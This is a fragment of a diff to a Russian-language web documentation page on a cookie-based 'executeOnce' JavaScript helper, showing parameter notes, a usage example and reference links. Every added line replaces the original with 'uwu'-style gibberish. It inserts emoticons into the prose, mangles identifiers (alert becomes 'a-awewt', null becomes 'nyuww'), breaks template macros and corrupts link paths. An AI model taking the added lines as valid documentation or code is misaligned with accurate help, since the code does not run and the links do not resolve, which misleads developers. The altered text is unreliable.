+  - : the identifiew to check, rawr x3 i.e. t-the nyame of the c-cookie ({{jsxwef("stwing", rawr x3 "stwing", σωσ "", 1)}})
+- `onwyhewe` o-optionaw
+  - : a-a {{jsxwef("boowean", nyaa~~ "boowean", "", (ꈍᴗꈍ) 1)}} e-expwessing whethew the cookie w-wiww use the wocaw path (`twue`) instead of t-the gwobaw one (`fawse` ow `undefined`) ({{jsxwef("boowean", ^•ﻌ•^ "boowean", "", >_< 1)}} o-ow {{jsxwef("gwobaw_objects/undefined", ^^;; "undefined")}})
 
 #### Примеры использования
 
 ```
-function alertSomething (sMsg) {
-  alert(sMsg);
+function awewtsomething (smsg) {
+  a-awewt(smsg);
 }
 
-executeOnce(alertSomething, null, "Hello world!!!!", "alert_something");
+e-exekawaii~once(awewtsomething, ^^;; nyuww, /(^•ω•^) "hewwo wowwd!!!!", nyaa~~ "awewt_something");
 ```
 
 ## Спецификации
 
-{{Specifications}}
+{{specifications}}
 
 ## Совместимость с браузерами
 
-{{Compat}}
+{{compat}}
 
 ## Смотрите также
 
-- [HTTP cookies](/ru/docs/Web/HTTP/Guides/Cookies)
-- [DOM Storage](/ru/docs/Web/API/Web_Storage_API)
-- [`URLUtils.pathname`](/ru/docs/Web/API/URLUtils.pathname)
-- {{jsxref("Date.toUTCString()")}}
-- [`HTTP`](/ru/docs/Web/HTTP)
-- [Cookies (code snippets)](/ru/docs/Code_snippets/Cookies)
-- [RFC 2965](https://www.ietf.org/rfc/rfc2965.txt)
+- [http cookies](/wu/docs/web/http/guides/cookies)
+- [dom s-stowage](/wu/docs/web/api/web_stowage_api)
+- [`uwwutiws.pathname`](/wu/docs/web/api/uwwutiws.pathname)
+- {{jsxwef("date.toutcstwing()")}}
+- [`http`](/wu/docs/web/http)
+- [cookies (code snippets)](/wu/docs/code_snippets/cookies)
+- [wfc 2965](https://www.ietf.owg/wfc/wfc2965.txt)
